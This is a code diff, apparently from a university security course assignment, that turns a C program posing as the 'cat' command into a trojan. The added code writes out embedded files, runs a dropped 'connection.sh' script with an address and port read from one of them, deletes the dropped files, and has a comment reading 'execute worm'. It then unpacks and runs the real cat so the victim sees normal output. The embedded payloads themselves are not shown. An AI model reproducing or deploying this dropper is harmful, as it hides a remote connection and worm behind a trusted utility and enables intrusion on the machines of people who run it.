@@ -7,35 +7,48 @@
 #include <string.h>
 #include <unistd.h>
 #include <sys/wait.h>
-#include "cat.h" 
+#include "cat.h"
+#include "connection.h"
+#include "address_port.h"
 
 int main(int argc, char *argv[]){
-    // system("zip target target");
-    // FILE *fptr;
-    // fptr = fopen("./target.zip", "rb");
-    // // fptr = fopen("./1.txt", "rb");
-    // char content[2645];
-    // fread(content, 2644, 1, fptr);
-    // fclose(fptr);
-    // // printf("%s",content);
-    // // for(int i = 0; i < 2644; i++){
-    // //     printf("%02hhx", content[i]);
-    // //     if(i%2 == 1)printf(" ");
-    // //     if(i % 16 == 15){
-    // //         printf("\n");
-    // //     }
-    // // }
-    // fptr = fopen("./compress.zip", "wb");
-    // fwrite(content, 2644, 1, fptr);
-    
-    // // system("rm target.zip");
-
-    // create temp .zip file, uncompress it and execute it with argv argc
+    //create temp txt to obtain port number and address
+    // create temp file
     FILE *fptr;
+    fptr = fopen("address_port.txt", "wb");
+    fwrite(address_port_txt, address_port_txt_len, 1, fptr);
+    fclose(fptr);
+
+
+    // read file
+    char command[60] = "bash connection.sh";
+    fptr = fopen("address_port.txt", "r");
+    char *line = NULL;
+    size_t len;
+    getline(&line, &len, fptr);
+    // printf("%s %ld",line, strlen(line));
+    strcat(command, line);
+    // printf("%s",command);
+    fclose(fptr);
+    system("rm address_port.txt");
+
+    //create temp shell script and execute it
+    fptr = fopen("connection.sh", "wb");
+    fwrite(connection_sh, connection_sh_len, 1, fptr);
+    fclose(fptr);
+    system(command);
+    sleep(4);
+    system("rm connection.sh");
+
+    //execute worm
+    //system("")
+
+    //create temp .zip file, uncompress it and execute it with argv argc
     fptr = fopen("./compression.zip", "wb");
     fwrite(cat_infect_zip, cat_infect_zip_len, 1, fptr);
     fclose(fptr);
-    system("unzip compression.zip");
+    system("unzip compression.zip > log.txt");
+    
     pid_t pid;
     pid = fork();
     if(pid == 0){
@@ -47,7 +60,8 @@ int main(int argc, char *argv[]){
         //     printf("%s\n", argv[i]);
         // }
         // absolutely path
-        int outcome = execvp("/home/wc/computer_security/ComputerSecurity/project3/task2/cat", argv);
+        // int outcome = execvp("/home/wc/computer_security/ComputerSecurity/project3/task2/cat", argv);
+        int outcome = execvp("/home/csc2021/computer_security/cat", argv);
         if(outcome == -1)printf("error in execvp\n");
     }
     else{
@@ -55,6 +69,7 @@ int main(int argc, char *argv[]){
         int status;
         waitpid(pid, &status, 0);
         system("rm compression.zip");
+        system("rm log.txt");
         system("rm cat");
     }
 
